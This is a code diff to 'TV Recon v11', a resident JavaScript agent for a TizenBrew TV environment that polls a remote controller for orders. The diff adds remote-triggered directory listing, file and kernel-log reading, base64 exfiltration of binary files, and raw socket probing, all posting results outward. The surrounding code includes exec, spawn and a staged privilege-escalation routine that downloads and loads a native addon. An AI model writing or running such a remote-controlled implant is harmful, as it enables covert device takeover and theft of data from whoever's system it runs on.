@@ -1,4 +1,4 @@
-/* TV Recon v10 — LONG-LIVED RESIDENT AGENT.
+/* TV Recon v11 — LONG-LIVED RESIDENT AGENT.
  * Runs in the TizenBrew service vm context. No crash markers, no throws —
  * a single resident module with a polling loop. Orders from /mode:
  *   {"action":"recon"}   light status posts
@@ -33,8 +33,8 @@ function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.messag
 function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
 function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }
 
-console.log('TV Recon v10 resident agent starting');
-post('v10-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
+console.log('TV Recon v11 resident agent starting');
+post('v11-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
 
 function getMode(cb) {
     try {
@@ -210,6 +210,94 @@ function doDlopentest(mode) {
     } catch (e) { post('dlopentest-outer-err', String(e)); }
 }
 
+function doLsdir(mode) {
+    try {
+        var entries = T(function () { return fs.readdirSync(mode.path); });
+        post('lsdir-out', { path: mode.path, entries: entries });
+    } catch (e) { post('lsdir-err', { path: mode.path, err: String(e) }); }
+}
+
+function doNread(mode) {
+    /* non-blocking device/file read: O_NONBLOCK, drain until EAGAIN. Safe for /dev/kmsg */
+    try {
+        var fd = fs.openSync(mode.path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
+        var chunks = [];
+        var buf = new Buffer(16384);
+        var total = 0;
+        var limit = mode.max || 262144;
+        while (total < limit) {
+            var n;
+            try { n = fs.readSync(fd, buf, 0, buf.length, null); }
+            catch (e) { break; } /* EAGAIN etc. */
+            if (n <= 0) break;
+            chunks.push(buf.slice(0, n));
+            total += n;
+        }
+        fs.closeSync(fd);
+        var s = Buffer.concat(chunks).toString('utf8');
+        var CH = 3500;
+        for (var i = 0; i < s.length; i += CH) {
+            post('nread-out', { path: mode.path, i: i / CH, total: Math.ceil(s.length / CH), s: s.slice(i, i + CH) });
+        }
+        post('nread-done', { path: mode.path, len: s.length });
+    } catch (e) { post('nread-err', { path: mode.path, err: String(e) }); }
+}
+
+function doRead64(mode) {
+    /* binary-safe read -> base64 chunks (offset+length supported) */
+    try {
+        var fd = fs.openSync(mode.path, 'r');
+        var start = mode.offset || 0;
+        var len = mode.len || 65536;
+        var buf = new Buffer(len);
+        var n = fs.readSync(fd, buf, 0, len, start);
+        fs.closeSync(fd);
+        var b64 = buf.slice(0, n).toString('base64');
+        var CH = 3500;
+        for (var i = 0; i < b64.length; i += CH) {
+            post('read64-out', { path: mode.path, offset: start, n: n, i: i / CH, s: b64.slice(i, i + CH) });
+        }
+        post('read64-done', { path: mode.path, offset: start, n: n });
+    } catch (e) { post('read64-err', { path: mode.path, err: String(e) }); }
+}
+
+function doNetprobe(mode) {
+    /* raw socket prober: TCP or UNIX; send bytes (hex or utf8); capture reply */
+    try {
+        var net = require('net');
+        var isUnix = !!mode.unix;
+        var opts = isUnix ? { path: mode.unix } : { host: mode.host || '127.0.0.1', port: mode.port };
+        var sock = net.connect(opts);
+        var out = '';
+        var done = false;
+        var finish = function (tag, extra) {
+            if (done) return;
+            done = true;
+            var CH = 3500;
+            for (var i = 0; i < out.length; i += CH) {
+                post('netprobe-out', { target: isUnix ? mode.unix : (mode.host + ':' + mode.port), i: i / CH, s: out.slice(i, i + CH), b64: mode.b64 });
+            }
+            post('netprobe-done', { target: isUnix ? mode.unix : (mode.host + ':' + mode.port), len: out.length, extra: extra || null });
+            try { sock.destroy(); } catch (e) {}
+        };
+        var timer = setTimeout(function () { finish('timeout'); }, mode.timeout || 4000);
+        sock.setTimeout(mode.timeout || 4000, function () { finish('timeout'); });
+        sock.on('connect', function () {
+            try {
+                if (mode.sendHex) sock.write(new Buffer(mode.sendHex, 'hex'));
+                if (mode.send) sock.write(mode.send);
+            } catch (e) { finish('senderr:' + e); }
+        });
+        sock.on('data', function (d) {
+            if (mode.b64) out += d.toString('base64');
+            else out += d.toString('utf8');
+            if (out.length > 65536) { clearTimeout(timer); finish('maxlen'); }
+        });
+        sock.on('error', function (e) { clearTimeout(timer); finish('error:' + e.code); });
+        sock.on('close', function () { clearTimeout(timer); finish('closed'); });
+    } catch (e) { post('netprobe-err', { err: String(e) }); }
+}
+
 function doExploit(mode) {
     /* Choreographed escalation train, one boot:
      * 1. download N-API addon  2. require() it  3. read constructor marker
@@ -310,6 +398,10 @@ function tick() {
                 }
                 if (!alreadyRan) {
                 if (mode.action === 'readfile') doReadfile(mode);
+                else if (mode.action === 'lsdir') doLsdir(mode);
+                else if (mode.action === 'nread') doNread(mode);
+                else if (mode.action === 'read64') doRead64(mode);
+                else if (mode.action === 'netprobe') doNetprobe(mode);
                 else if (mode.action === 'dlopentest') doDlopentest(mode);
                 else if (mode.action === 'exec') doExec(mode);
                 else if (mode.action === 'spawn') doSpawn(mode);
